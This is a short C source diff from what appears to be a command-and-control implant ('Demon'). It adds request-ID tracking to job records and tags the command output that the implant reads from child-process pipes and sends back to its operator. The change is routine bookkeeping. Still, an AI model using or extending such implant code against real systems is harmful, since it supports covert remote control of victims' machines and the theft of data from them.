@@ -15,7 +15,7 @@
  * @param Data Data pointer to extra data
  * @return
  */
-VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
+VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
 {
     PRINTF( "Add job => JobID:[%d] Type:[%d] State:[%d] Handle:[%d] Data:[%p]\n", JobID, Type, State, Handle, Data )
 
@@ -25,12 +25,13 @@ VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
     Job = Instance.Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );
 
     // fill the Job info and insert it into our linked list
-    Job->JobID  = JobID;
-    Job->Type   = Type;
-    Job->State  = State;
-    Job->Handle = Handle;
-    Job->Data   = Data;
-    Job->Next   = NULL;
+    Job->RequestID = RequestID;
+    Job->JobID     = JobID;
+    Job->Type      = Type;
+    Job->State     = State;
+    Job->Handle    = Handle;
+    Job->Data      = Data;
+    Job->Next      = NULL;
 
     if ( Instance.Jobs == NULL )
     {
@@ -151,7 +152,7 @@ VOID JobCheckList()
 
                                 if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
+                                    PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
                                     PackageAddBytes( Package, Buffer, Available );
                                     PackageTransmit( Package, NULL, NULL );
                                 }
@@ -349,7 +350,7 @@ BOOL JobKill( DWORD JobID )
 
                                 if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
+                                    PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
                                     PackageAddBytes( Package, Buffer, Available );
                                     PackageTransmit( Package, NULL, NULL );
                                 }
